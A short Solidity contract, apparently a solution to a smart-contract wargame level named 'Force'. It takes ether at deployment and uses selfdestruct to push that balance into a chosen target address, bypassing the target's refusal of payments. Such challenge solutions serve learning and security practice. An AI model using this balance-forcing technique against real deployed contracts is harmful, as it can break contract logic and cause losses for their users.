// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceSolved {

  constructor () public payable {}

  function kill(address payable _forceAddress) public {
    selfdestruct(_forceAddress);
  }
}